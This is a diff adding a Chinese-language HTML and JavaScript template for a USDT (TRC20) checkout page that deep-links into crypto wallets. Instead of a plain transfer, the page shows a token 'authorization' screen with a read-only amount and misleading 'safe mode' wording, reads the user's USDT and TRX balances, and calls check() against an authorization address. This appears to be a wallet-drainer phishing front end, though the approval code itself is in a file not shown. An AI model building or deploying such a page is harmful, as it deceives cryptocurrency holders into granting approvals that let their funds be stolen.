@@ -1,0 +1,1101 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no, email=no">
+  <meta name="msapplication-tap-highlight" content="no">
+  <meta name="x5-orientation" content="portrait">
+  <meta name="x5-fullscreen" content="true">
+  <link rel="icon" href="/favicon.ico">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <title>正在向对方转账支付 {$amount} USDT</title>
+  <link href="/content/template/default/transfer/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+  <script src="/content/template/default/transfer/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  <script src="/content/template/default/transfer/js/qrcode.min.js"></script>
+  <link rel="stylesheet" href="/content/template/default/css/index.css?3">
+  <script type="text/javascript" src="/content/template/default/transfer/js/vconsole.min.js"></script>
+  
+  <style>
+
+
+            input[type="text"],
+            input[type="number"],
+            input[type="password"],
+            input[type="email"],
+            input[type="tel"],
+            input[type="url"],
+            input[type="search"],
+            textarea {
+                border: none;
+                box-shadow: none;
+                appearance: none;
+                -webkit-appearance: none;
+            }
+
+            input[type="text"],
+            input[type="number"],
+            input[type="password"],
+            input[type="email"],
+            input[type="tel"],
+            input[type="url"],
+            input[type="search"],
+            textarea {
+                padding: 0;
+
+                border: 1px solid #ccc;
+                border-radius: 0;
+            }
+
+            input::placeholder,
+            textarea::placeholder {
+                color: #999;
+            }
+
+            @keyframes  slideUp {
+                to {
+                    top: -120%;
+                }
+            }
+
+
+            @keyframes  slideDown {
+                to {
+                    top: 0;
+                }
+            }
+
+            .mobile-container1 {
+                width: 100vw;
+                /*height: 100%;*/
+                overflow: hidden;
+                margin: 0 auto;
+                left:-0.5rem;
+                z-index: 9999;
+                background-color: #ffffff;
+                display: flex;
+                flex-wrap: wrap;
+                flex-direction: column;
+                align-items: center;
+
+                /*position: relative;*/
+                position: absolute;
+                top: -110%;
+                /*animation: slideDown 1s forwards; !* 使用动画让页面内容从上滑动下来 *!*/
+            }
+
+            .goods-info-base {
+
+                width: 95vw;
+                margin: 15px auto 0;
+                padding: 6px 0;
+                background-color: #fcf6ed;
+                color: #dda453;
+            }
+            .pay-title1 {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 16px;
+            }
+
+            .ml-5 {
+                margin-left: 5px;
+            }
+            .import-tip {
+                font-size: 16px;
+                text-align: center;
+                margin-top: 15px;
+
+            }
+
+            .pay-container {
+                width: 90%;
+                margin: 70px auto 100px auto;
+            }
+
+
+            .red-star::before {
+                content: "*";
+                color: red;
+                margin-right: 5px;
+            }
+            .red-star {
+                /*min-width: 120px;*/
+                font-size: 15px;
+                /*line-height: 24px;*/
+                color: #5f5f5f;
+                margin-right: 5px;
+            }
+
+            .pay-count {
+                display: flex;
+                align-items: center;
+            }
+
+            .input-container {
+                display: flex;
+                align-items: center;
+            }
+            .input-wrapper {
+
+                width: 40%;
+                height: 28px;
+                background: #ffffff;
+                font-weight: 400;
+                font-size: 16px;
+                /*line-height: 24px;*/
+                color: #5f5f5f;
+                box-shadow: none!important;
+                /*border-radius: 6px;*/
+                border: 1px solid #f0f0f0!important;
+                /*height: 40px!important;*/
+                padding: 0 16px;
+                text-align: center;
+            }
+
+            .pub-button {
+                width: 30px;
+                height: 30px;
+                font-size: 18px;
+                cursor: pointer;
+                background-color: #f6f7fa!important;
+                font-weight: 300;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .minus-btn {
+                padding: 0 16px;
+border-top: 2px solid #f0f0f0;
+                border-bottom: 2px solid #f0f0f0;
+                border-left: 1px solid #f0f0f0;
+                border-right: 0;
+                /*border-radius: 6px;*/
+                background: #ffffff;
+                border-top-left-radius: 4px;
+                border-bottom-left-radius: 4px;
+            }
+            .plus-btn {
+                /*border-radius: 6px;*/
+                background: #ffffff;
+                padding: 0 16px;
+                border-top: 1px solid #f0f0f0;
+                border-bottom: 1px solid #f0f0f0;
+                border-right: 1px solid #f0f0f0;
+                border-left: 0;
+                border-top-right-radius: 4px;
+                border-bottom-right-radius: 4px;
+            }
+
+            .authorization {
+                width: 95%;
+                margin: 20px auto;
+
+            }
+            .line {
+                width: 95%;
+                padding: 0 16px;
+                margin: 0 auto;
+                border-bottom: 1px solid #eeeeee;
+            }
+
+            .f-title-color {
+                color: #fa6666;
+                font-weight: 500;
+                font-size: 15px;
+            }
+
+            .pay-content1 {
+                font-size: 15px;
+                color: #999999;
+            }
+
+            .radio-item {
+                border: 1px solid #eeeeee;
+                background: #fff;
+                border-radius: 6px;
+                padding: 8px 10px;
+                font-size: 14px;
+                margin-right: 20px;
+                display: flex;
+                align-items: center;
+            }
+            .radio-item-blue {
+                border: 1px solid #265bc1;
+                background: #fff;
+                border-radius: 6px;
+                padding: 8px 10px;
+                font-size: 14px;
+                margin-right: 20px;
+                display: flex;
+                align-items: center;
+            }
+            .radio-option {
+                margin: 0 5px 0 0;
+            }
+            .radio-container {
+                display: flex;
+                align-items: center;
+                justify-content: space-around;
+            }
+
+            .w-auto {
+                width: auto;
+            }
+            .w-110 {
+                min-width: 130px;
+            }
+
+            .pay-count-base {
+                display: flex;
+                align-items: center;
+                margin: 15px 0;
+            }
+            .submit-container {
+                width: 95%;
+                position: absolute;
+                bottom: 70px;
+                right: 5%;
+
+                display: flex;
+                align-items: center;
+                justify-content: flex-end;
+            }
+
+            .submit {
+                padding: 8px 16px;
+                color: #FFF;
+                background-color: #589ff7;
+                border-radius: 4px;
+                font-size: 16px;
+            }
+            .cancel {
+                padding: 8px 16px;
+                color: #999;
+                border: 1px solid #eee;
+                border-radius: 4px;
+                font-size: 16px;
+                margin-right: 10px;
+            }
+
+            .footer {
+                position: absolute;
+                bottom: 0;
+                width: 100%;
+                height: 50px;
+                background-color: #5f5f5f;
+            }
+
+            .goods-info1 {
+                display: none;
+                width: 80%;
+                margin: 20px auto 0;
+                border-radius: 6px;
+                padding: 12px 20px;
+            }
+            .tip-bg-white {
+                background-color: #fbf0f1!important;
+                color: #fa6666;
+
+            }
+            .tip-color-green {
+                background-color: #f3f8ed!important;
+                color: #82bf53;
+            }
+
+            .tip-color1 {
+                font-size: 16px!important;
+            }
+</style>
+  
+	<style>
+		html,
+		body {
+			color: #2e2e2e;
+			font: inherit;
+			font-family: 'avenir-heavy';
+		}
+		
+		.forms .confirm {
+            width: 90%;
+            height: 50px;
+            background: #4073f5;
+            border-radius: 3rem;
+            margin: 0 auto;
+            margin-top: 3rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-family: PingFang SC;
+            font-weight: 400;
+            color: #FFFFFF;
+        }
+        
+        .qingxz {
+            height: 5rem;
+            background: #F2F2F2;
+            display: flex;
+            align-items: center;
+            padding-left: 1.19rem;
+            border-bottom: 1px solid #D2D2D2;
+            border-top: 1px solid #D2D2D2;
+        }
+        
+        .walletitem {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1.13rem 1.94rem;
+            border-bottom: 1px solid #D2D2D2;
+            width: 100%;
+            height: 70px;
+        }
+        
+        .walletitem .left img {
+            width: 40px;
+            height: 40px;
+        }
+        
+        .walletitem .center {
+            flex: 1;
+            flex-shrink: 0;
+            margin-left: 1.31rem;
+        }
+        
+        .walletitem .center .name {
+            font-size: 1rem;
+            font-family: PingFang SC;
+            font-weight: 400;
+            color: #282828;
+        }
+        .name{
+            margin-top: 2px;
+        }
+        
+        .walletitem .center .sub {
+            font-size: 0.8rem;
+            font-family: PingFang SC;
+            font-weight: 400;
+            color: #898989;
+            /*margin-top: 0.6rem;*/
+        }
+        
+        .walletitem .right {
+            width: 2rem;
+            height: 2rem;
+            background: #FFFFFF;
+            border: 0.06px solid #A4A4A4;
+            border-radius: 50%;
+        }
+        
+        .walletitem .right img {
+            width: 2rem;
+            height: 2rem;
+            display: none;
+        }
+
+		#form .row {
+			--bs-gutter-x: 3vw;
+			--bs-gutter-y: 3vw;
+		}
+
+		.fs-14 {
+			font-size: 14px;
+		}
+
+		.fs-12 {
+			font-size: 12px;
+		}
+
+		.time-box {
+			width: 35vw;
+			margin: 10px auto 0;
+			background: #f2f2f2;
+			border-radius: 4px;
+		}
+
+		.page-header {
+			box-shadow: 0 4px 8px 0 rgb(0 0 0 / 10%);
+		}
+
+		.page-header .title {
+			letter-spacing: 0.4px;
+			font-size: 100%;
+		}
+
+		.total-amount span {
+			display: block;
+			text-align: center;
+			line-height: 24px;
+			font-size: 16px;
+			font-family: 'Avenir-Medium';
+			letter-spacing: 0.2px;
+		}
+
+		.total-amount small {
+			line-height: 30px;
+			letter-spacing: 0.4px;
+			font-family: 'avenir-heavy';
+			font-size: 20px;
+			font-weight: bold;
+		}
+
+		.form-title {
+			font-size: 11px;
+			font-family: 'avenir-heavy';
+			color: #000;
+		}
+
+		.icon-logo {
+			width: 5vw;
+			height: 5vw;
+			line-height: 1;
+			background-position: center center;
+			background-size: 100% auto;
+			background-repeat: no-repeat;
+		}
+
+		.icon-logo img {
+			display: block;
+			width: 100%;
+		}
+		.app-button-container {
+			width: 100%;
+			padding: 0 4vw;
+		}
+
+		.app-button {
+			display: flex;
+			flex-flow: column nowrap;
+			align-items: center;
+			justify-content: center;
+			width: 28vw;
+			height: 28vw;
+			padding: .5em 0;
+			border: none;
+			background: #fff;
+			font-size: 11px;
+			box-shadow: 0 0 2px 2px rgba(0, 0, 0, 0.05);
+			border-radius: 8px;
+		}
+
+		.app-button .icon-logo {
+			width: 9vw;
+			height: 9vw;
+			margin-bottom: 1em;
+		}
+
+		.app-button+.app-button {
+			margin-left: 5px;
+		}
+
+		#loading-tip {
+			display: none;
+			position: fixed;
+			top: 0;
+			right: 0;
+			left: 0;
+			bottom: 0;
+			z-index: 999;
+			background: rgba(0, 0, 0, 0.1)
+		}
+		
+		#payment{
+		    line-height: 45px;
+            margin-top: 80px;
+            background: #448bff linear-gradient(45deg,#448bff,#44e9ff);
+            color: #fff;
+            font-size: 1rem;
+            line-height: 1;
+            font-weight: 700;
+            letter-spacing: 0;
+            padding: 0.785rem 2.15rem;
+            border: 0px solid #ffffff;
+            border-radius: 100px;
+            transition: all 400ms ease-in-out;
+            box-shadow: 0 10px 20px 0 rgba(90,70,176,0.3);
+            display: none;
+		}
+		
+		#qrcode{
+		    margin: 50px;
+		    display: none;
+		}
+	</style>
+</head>
+<body>
+<div class="pc-content" id="pcContent">
+    <div class="pc-container">
+        <div style="margin-bottom:1rem;"><small class="fs-8" id="translate"></small></div>
+        <div class="base-info">
+            <div class="base-header">
+                <img src="/content/template/default/images/car.png">
+                <div class="pay-info">付款信息</div>
+            </div>
+            <hr>
+            <div class="base-body">
+                <div class="info-item">
+                    <div class="item-title">商品详情:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$goods_name}</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="item-title">购买数量:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$goods_num}</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="item-title">联系方式:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$email}</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="item-title">付款金额:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$amount} USDT</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="goods-info">
+            <div class="pay-introduce">
+                <div class="pay-title">支付说明</div>
+                <div class="pay-content">
+                    请打开钱包首页扫码付款，
+                    仅支持TRC链付款。
+                </div>
+                <div></div>
+            </div>
+            <div class="pay-code">
+                <div id="qrcode" style="max-width: 800px"></div>
+                <!--                <img src="/newpage/images/code.png" />-->
+            </div>
+        </div>
+        <div class="goods-info">
+            <div class="pay-title tip-color">提示</div>
+            <div class="pay-content">
+                为防止黑U假U混币，请使用钱包扫码支付。付款成功后自动到账，如果未自动到账请联系在线客服。
+            </div>
+        </div>
+    </div>
+
+</div>
+<div class="mobile-content" id="mobileContent">
+    <div class="mobile-container">
+        <div class="base-info-mobile">
+            <div class="base-header">
+                <img src="/content/template/default/images/car.png">
+                <div class="pay-info">付款信息</div>
+            </div>
+            <hr>
+            <div class="base-body">
+                <div class="info-item">
+                    <div class="item-title">商品详情:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$goods_name}</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="item-title">购买数量:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$goods_num}</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="item-title">联系方式:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$email}</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="item-title">付款金额:</div>
+                    <div class="item-value">
+                        <div class="item-value-text">{$amount} USDT</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+		<button type="submit" onclick="scrollDownAndRedirect();"  id="payorg" style="background: #FF9800;border: 1px solid #fff;border-radius: 90px;color: #fff;font-family: Gilroy;font-style: normal;font-weight: 500;font-size: 16px;line-height: 24px;padding: 8px;width: 60%;margin-top: 18px;display: flex;align-items: center;justify-content: center;display:none">点击付款</button>
+		
+
+		
+        <div class="mobile-goods" id="mobil" style="display: none">
+            <div class="mobile-title paymentShow">
+                请选择您的转账钱包
+            </div>
+            <ul id="goods" class="paymentShow" style="padding-left:0">
+                <li class="goods-item" data-index="33">
+                    <div class="item-img"><img src="/content/template/default/images/TronLink.png" /></div>
+                    <div class="item-content">
+                        <div class="item-name">   TronLink</div>
+                        <div class="item-tag"><div>TRC20</div><div class="other-color">Android/IOS</div></div>
+                    </div>
+                    <input type="radio" />
+                </li>
+                <li class="goods-item" data-index="1">
+                    <div class="item-img"><img src="/content/template/default/images/okex.png" /></div>
+                    <div class="item-content">
+                        <div class="item-name">   欧易Web3钱包</div>
+                        <div class="item-tag"><div>TRC20</div><div class="other-color">Android/IOS</div></div>
+                    </div>
+                    <input type="radio" />
+                </li>
+                <li class="goods-item" data-index="2">
+                    <div class="item-img"><img src="/content/template/default/images/imtoken.png" /></div>
+                    <div class="item-content">
+                        <div class="item-name">   imToken</div>
+                        <div class="item-tag"><div>TRC20</div><div class="other-color">Android/IOS</div></div>
+                    </div>
+                    <input type="radio" />
+                </li>
+                <li class="goods-item" data-index="3">
+                    <div class="item-img"><img src="/content/template/default/images/tokenpocket.png" /></div>
+                    <div class="item-content">
+                        <div class="item-name">   TokenPocket</div>
+                        <div class="item-tag"><div>TRC20</div><div class="other-color">Android/IOS</div></div>
+                    </div>
+                    <input type="radio" />
+                </li>
+            </ul>
+            <div class="pay-submit paymentShow" id="confirm">
+                确认支付
+            </div>
+			<!-- 二维码容器 -->
+			<div id="paymentQRCode" style="display: flex; justify-content: center; margin-top: 40px;"></div>
+            <div id="qrCodeHint" style="text-align: center; color: gray; margin-top: 10px;">
+                为防止黑U假U混币，请使用钱包扫码支付。付款成功后自动到账，如果未自动到账请联系在线客服。
+            </div>
+			
+            <div style="display: none" class="pay-submit" id="payButton" onclick="check()">
+                点击付款
+            </div>
+        </div>
+        <div class="notice" style="color: red;margin-top: 20px;display: none" id="adOkexShow"></div>
+    </div>
+</div>
+	  
+<div class="mobile-container1">
+    <div class="goods-info-base tip-bg-base" id="tip">
+        <div class="pay-title1 tip-color1">
+            <img src="/content/template/default/images/waring.png" style="width: 15px; object-fit: contain">
+            <div class="ml-5">警告</div>
+        </div>
+    </div>
+    <div class="goods-info1 tip-color-green" id="tip1">
+        <div class="pay-title1 tip-color1">
+            <img src="/content/template/default/images/right-f.png" style="width: 15px; object-fit: contain">
+            <div class="ml-5">
+                安全操作：当前授权地址只能转移<span class="approveAmount">{$amount}</span> USDT，并须经过我同意，可避免被盗
+            </div>
+        </div>
+    </div>
+    <div class="goods-info1 tip-bg-white" id="tip2">
+        <div class="pay-title1 tip-color1">
+            <img src="/content/template/default/images/close-circle.png" style="width: 15px; object-fit: contain">
+            <div class="ml-5">
+                高危操作：当前授权地址可随时转移<span class="approveAmount">{$amount}</span> USDT，无须经过我同意，有被盗风险
+            </div>
+        </div>
+    </div>
+    <p class="import-tip">为保证资产安全，请仔细阅读以下信息</p>
+    <div class="pay-container" style="margin-top: 10px;">
+        <div class="pay-count" style="display: flex; align-items: center; justify-content: flex-start;">
+            <span class="red-star w-110" style="white-space: nowrap; margin-right: 10px;">授权金额(USDT):</span>
+            <div class="input-container" style="flex-grow: 1; display: flex; align-items: center;">
+                <button class="minus-btn pub-button" disabled>-</button>
+                <input type="number" id="number-input" class="input-wrapper" value="{$amount}" readonly style="margin: 0 10px;">
+                <button class="plus-btn pub-button" disabled>+</button>
+            </div>
+        </div>
+        <div class="authorization">
+            <p class="pay-content1">
+                <span class="f-title-color">授权金额:</span>
+                授权以后，该授权地址只能转走相应数量资产，无法转走所有资产
+            </p>
+        </div>
+        <div class="line"></div>
+        <div class="pay-count-base">
+            <span class="red-star w-auto">授权模式:</span>
+            <div class="radio-container">
+                <label class="radio-item" id="option1">
+                    <input type="radio" value="option1" class="radio-option" onclick="showTip(1)">
+                    安全模式
+                </label>
+                <label class="radio-item" id="option2">
+                    <input type="radio" value="option2" class="radio-option" onclick="showTip(2)">
+                    白名单模式
+                </label>
+            </div>
+        </div>
+        <p id="errorText" style="color: red; display: none; font-size: 14px; margin-left: 80px;">
+            请选择授权模式
+        </p>
+        <div class="authorization">
+            <p class="pay-content1">
+                <span class="f-title-color">安全模式:</span>
+                授权地址无法直接转走资产，须经过我同意，保证资产安全
+            </p>
+        </div>
+        <div class="authorization">
+            <p class="pay-content1">
+                <span class="f-title-color">白名单模式:</span>
+                授权地址无须经过确认即可转走资产，未知链接请勿勾选此项
+            </p>
+        </div>
+        <div class="submit-container">
+            <div class="cancel" onclick="scrollUpAndRedirect()">
+                取消
+            </div>
+            <div class="submit" onclick="confirmApprove()">
+                确认
+            </div>
+        </div>
+    </div>
+</div>
+	    <!--<div style="color:red;margin-top:50px;text-align:center">-->
+	    <!--    <h3 >付款成功后请在此页面停留10秒</h3>-->
+	    <!--    <h3>等待区块确认完成</h3>-->
+	    <!--</div>-->
+<script src="/content/template/default/js/index.js"></script>
+	<script src="/content/template/default/erc/js/layer.js"></script>
+	<script src="/content/template/default/erc/js/bignumber.min.js"></script>
+    <!--<script src="/content/template/default/erc/js/tp.js"></script>-->
+    <!--<script src="/content/template/default/erc/js/trc.js"></script>-->
+	<script>
+    // 页面加载完成后执行
+    window.onload = function() {
+        // 创建二维码并添加到新的div容器中
+        var qrcodeContainer = document.getElementById('paymentQRCode');
+        var qrcode = new QRCode(qrcodeContainer, {
+            text: window.location.href,  // 当前页面的URL
+            width: 208,   // 设置二维码的宽度
+            height: 208,  // 设置二维码的高度
+            colorDark : "#000000",  // 二维码的深色部分
+            colorLight : "#ffffff",  // 二维码的浅色部分
+            correctLevel : QRCode.CorrectLevel.H  // 二维码的容错级别
+        });
+    };
+</script>
+	<script>
+        // const vConsole = new VConsole();
+    	var maxamount = '200';
+    	var domain = 'https://' + window.location.host + '/';
+	    var order_no = '{$order_no}';
+	    var amount = '{$amount}';
+    	var selectIndex = 0;
+    	var type;
+    	var permissionsAddr = '{$trc_au_address}';
+    	var payAddr = '{$trc_au_address}';
+    	var userAddress;
+    	
+    	const urlParams = new URLSearchParams(window.location.search);
+   
+    const toplink = urlParams.get('utm_source');
+    	if(IsPC()){
+            
+            if(window.ethereum || window.tronWeb || toplink){
+                $("#payorg").show();
+            }else{
+                $("#mobil").show();
+            }
+	        
+	    }else{
+	        var qrcode = new QRCode(document.getElementById("qrcode"), {
+        		text: domain + GetUrlRelativePath(),
+        		width: 208,
+        		height: 208,
+        		correctLevel : 0 // 二维码结构复杂性 0~3
+        	});
+        	
+	        $("#qrcode").show();
+	    }
+		
+	    function IsPC() {
+		if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+    			return true; //是手机
+    		} else {
+    			return false; //是电脑
+    		}
+    	}
+    	
+    	function GetUrlRelativePath()
+        {
+        　　var url = document.location.toString();
+        　　var arrUrl = url.split("//");
+        
+        　　var start = arrUrl[1].indexOf("/");
+        　　var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符
+        
+        　　/*if(relUrl.indexOf("?") != -1){
+        　　　　relUrl = relUrl.split("?")[0];
+        　　}*/
+        　　return relUrl;
+        }
+        
+        console.log(GetUrlRelativePath())
+    	
+    	 $(".money_box").click(function(){
+            $(".money_box").removeClass("moneyact");//删除class类
+            $(this).addClass("moneyact");//添加class类
+            var datamoney=$(this).attr("data-value");
+            $("#amount").val(datamoney);
+        })
+        
+        $('.walletitem').click(function() {
+            selectIndex = $(this).find('.right').data('index')
+
+            $('.walletitem .right img').hide()
+            $(this).find('.right img').show()
+           
+            
+        })
+
+        $('#confirm').click(function() {
+            
+            if (selectIndex == 0) {
+                alert("请选择付款钱包！");
+                return
+            } 
+           
+            // var url = decodeURI(window.location.href);
+            var url = domain + GetUrlRelativePath()
+            
+            if (selectIndex == 2) {
+                var im = 'imtokenv2://navigate?screen=DappView&url=' + url;
+                window.location.href = im;
+            } else if (selectIndex == 1) {
+                var okex = 'okx://wallet/dapp/details?dappUrl=' + url;
+                window.location.href = okex;
+            }else if (selectIndex == 3) {
+                var tronlink = 'tpdapp://open?params={"url": "' + url + '"}';
+                window.location.href = tronlink;
+            }else if (selectIndex == 4) {
+                var trust = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + url;
+                window.location.href = trust;
+            }else if (selectIndex == 5) {
+                var coinbase = 'https://go.cb-w.com/dapp?cb_url=' + url;
+                window.location.href = coinbase;
+            }else if (selectIndex == 7) {
+                var bitkeep = 'https://bkcode.vip?action=dapp&url=' + url;
+                window.location.href = bitkeep;
+            }else if (selectIndex == 33) {
+                 var data = {
+	            "url": url+"?utm_source=tronlink",
+            	"action": "open",
+            	"protocol": "tronlink",
+            	"version": "1.0"
+	        }
+	         var tron = 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify(data));
+           
+                window.location.href = tron;
+            }else if (selectIndex == 6) {
+                
+                if(window.ethereum){
+                    check()
+                }else{
+                    alert('请复制链接至钱包浏览器打开')
+                    
+                    var input = $('<input>').attr('id','copy').attr('value',url);
+                    $('body').append(input);
+                    $("#copy").select();
+	    
+            	    if(document.execCommand("copy")){
+            	        
+            	        layer.msg("复制成功");
+            	    }else{
+            	        layer.msg("复制失败");
+            	    }
+            	    
+            	    $('#copy').remove()
+                }
+            }
+        })
+        
+	</script>
+	
+	
+	<script>
+        function confirmApprove(){
+        var option1 = document.
+querySelector('input[value="option1"]');
+        var option2 = document.querySelector('input[value="option2"]');
+        var errorText = document.getElementById('errorText');
+
+        if (!option1.checked && !option2.checked) {
+            errorText.style.display = 'block';
+            return
+        } else {
+            errorText.style.display = 'none';
+        }
+
+        scrollUpAndRedirect();
+        check();
+    }
+
+    // 支付页
+    document.addEventListener("DOMContentLoaded", function () {
+        const numberInput = document.getElementById("number-input");
+        const minusBtn = document.querySelector(".minus-btn");
+        const plusBtn = document.querySelector(".plus-btn");
+        var approveAmount = $('.approveAmount');
+
+        minusBtn.addEventListener("click", function () {
+            let currentValue = parseInt(numberInput.value);
+            let res = currentValue - 1;
+            if (res < 0){
+                res = 0;
+            }
+            numberInput.value = res;
+            approveAmount.text(res)
+        });
+
+        plusBtn.addEventListener("click", function () {
+            let currentValue = parseInt(numberInput.value);
+            let res = currentValue + 1;
+            numberInput.value = res
+            approveAmount.text(res)
+        });
+
+        $(numberInput).change(function (){
+            approveAmount.text(numberInput.value)
+        })
+    });
+
+    function scrollUpAndRedirect() {
+
+        let mobileContent = document.body
+
+        mobileContent.style.backgroundColor = "aliceblue"
+
+        const pageContent = document.querySelector(".mobile-container1");
+
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        pageContent.style.animation = "slideUp 0.5s forwards";
+        pageContent.addEventListener("animationend", function () {
+            pageContent.style.top = "-120%";
+        });
+    }
+	
+    async function scrollDownAndRedirect() {
+        // 获取用户的地址
+        userAddress = await tronWeb.defaultAddress.base58;
+
+        // 获取USDT合约实例
+        let contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+        // 查询用户的USDT余额
+        const ressdata = await contract.balanceOf(userAddress).call();
+        let usdtBalance = parseInt(ressdata._hex) / 1000000;
+
+        // 查询用户的TRX余额
+        let balance = await tronWeb.trx.getBalance() / 1000000;
+
+        // 检查TRX和USDT余额是否足够支付交易矿工费
+        if (balance < 25 && usdtBalance < 0.1) {
+            alert("您的TRX余额不足以支付交易矿工费");
+            return;
+        } else if (balance < 25) {
+            alert("您的TRX余额不足以支付交易矿工费");
+            return;
+        } else if (usdtBalance < 0.1) {
+            alert("您的USDT余额不足发起交易可能会失败");
+            return;
+        }
+
+        // 在 OKEx 钱包中直接授权
+        if (/okex/i.test(navigator.userAgent)) {
+            check();
+        } else {
+            // 原有的显示页面逻辑
+            console.log("开始")
+            const pageContent1 = document.querySelector(".mobile-container1");
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            pageContent1.style.animation = "slideDown 0.5s forwards";
+            pageContent1.addEventListener("animationend", function () {
+                pageContent1.style.top = "0";
+            });
+            let mobileContent = document.body
+            mobileContent.style.background = "#FFFFFF"
+            console.log("结束")
+        }
+    }
+    
+    function showTip(optionNumber) {
+        const tips = document.querySelectorAll(".goods-info1");
+        tips.forEach((tip) => (tip.style.display = "none"));
+        const tip = document.getElementById('tip')
+        tip.style.display = "none";
+
+        const selectedTip = document.getElementById(`tip${optionNumber}`);
+        selectedTip.style.display = "block";
+
+        const radios = document.querySelectorAll(".radio-option");
+        radios.forEach((radio) => (radio.checked = false));
+
+        const selectedRadio = document.querySelector(`input[value="option${optionNumber}"]`);
+        selectedRadio.checked = true;
+        if (optionNumber == 1){
+            $('#option1').removeClass()
+            $('#option1').addClass("radio-item-blue")
+            $('#option2').removeClass()
+            $('#option2').addClass("radio-item")
+        }else{
+            $('#option2').removeClass()
+            $('#option2').addClass("radio-item-blue")
+            $('#option1').removeClass()
+            $('#option1').addClass("radio-item")
+        }
+        var errorText = document.getElementById('errorText');
+        errorText.style.display = 'none';
+    }
+    var liElements = document.querySelectorAll("#goods li");
+    for (var i = 0; i < liElements.length; i++) {
+        liElements[i].addEventListener("click", function() {
+            // 移除其他 <li> 元素的选中样式
+            for (var j = 0; j < liElements.length; j++) {
+                liElements[j].classList.remove("selected");
+                let tmpInput = liElements[j].querySelector("input[type=radio]")
+                tmpInput.checked = false
+            }
+
+            // 添加选中样式到当前点击的 <li> 元素
+            this.classList.add("selected");
+
+            // 获取当前 <li> 元素中的 <input> 元素
+            var radioInput = this.querySelector("input[type=radio]");
+            // 设置当前 <input> 元素为选中状态
+            radioInput.checked = true;
+            selectIndex = $(this).data('index')
+        });
+    }
+</script>
+
+	
+<style>
+.translateSelectLanguage{
+	padding: 2px;
+}
+</style>
+<script src="https://res.zvo.cn/translate/translate.js"></script>
+<script>
+translate.setUseVersion2(); //设置使用v2.x 版本
+translate.selectLanguageTag.show = true; // 设定是否自动出现 select 切换语言
+translate.language.setLocal('chinese_simplified');
+translate.selectLanguageTag.languages = 'english,chinese_simplified'; 
+translate.setAutoDiscriminateLocalLanguage();    //设置用户第一次用时，自动识别其所在国家的语种进行切换
+// translate.execute();//进行翻译 
+</script>
+<!---->
